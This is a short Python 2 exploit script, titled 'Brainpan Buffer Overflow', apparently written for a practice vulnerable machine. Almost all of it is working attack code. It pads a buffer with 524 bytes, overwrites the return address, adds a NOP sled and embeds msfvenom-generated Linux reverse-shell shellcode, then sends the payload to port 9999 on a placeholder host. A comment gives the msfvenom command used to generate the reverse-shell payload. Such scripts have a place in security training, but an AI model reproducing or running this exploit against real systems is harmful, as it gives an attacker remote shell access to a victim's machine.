#!/usr/bin/python

print("""\
            ____            _                                            
           |  _ \          (_)                                           
           | |_) |_ __ __ _ _ _ __  _ __   __ _ _ __                     
           |  _ <| '__/ _` | | '_ \| '_ \ / _` | '_ \                    
           | |_) | | | (_| | | | | | |_) | (_| | | | |                   
           |____/|_|  \__,_|_|_| |_| .__/ \__,_|_| |_|                   
                                   | |                                   
  ____         __  __           ___|_|                __ _               
 |  _ \       / _|/ _|         / __ \                / _| |              
 | |_) |_   _| |_| |_ ___ _ __| |  | |_   _____ _ __| |_| | _____      __
 |  _ <| | | |  _|  _/ _ \ '__| |  | \ \ / / _ \ '__|  _| |/ _ \ \ /\ / /
 | |_) | |_| | | | ||  __/ |  | |__| |\ V /  __/ |  | | | | (_) \ V  V / 
 |____/ \__,_|_| |_| \___|_|   \____/  \_/ \___|_|  |_| |_|\___/ \_/\_/  

                    """)
print("by: Xcatolin")

import socket

# ShellCode:
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -b "\x00" -f c

shellcode = ("\xbf\x3a\xa7\xd9\xfc\xdd\xc1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x12\x31\x7a\x12\x83\xc2\x04\x03\x40\xa9\x3b\x09\x85\x6e\x4c"
"\x11\xb6\xd3\xe0\xbc\x3a\x5d\xe7\xf1\x5c\x90\x68\x62\xf9\x9a"
"\x56\x48\x79\x93\xd1\xab\x11\xe4\x8a\x74\x87\x8c\xc8\x84\x56"
"\x11\x44\x65\xe8\xcf\x06\x37\x5b\xa3\xa4\x3e\xba\x0e\x2a\x12"
"\x54\xff\x04\xe0\xcc\x97\x75\x29\x6e\x01\x03\xd6\x3c\x82\x9a"
"\xf8\x70\x2f\x50\x7a")

buffer = "A" * 524 + "\xf3\x12\x17\x31" + "\x90" * 16 + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("x.x.x.x",9999))
s.send(buffer)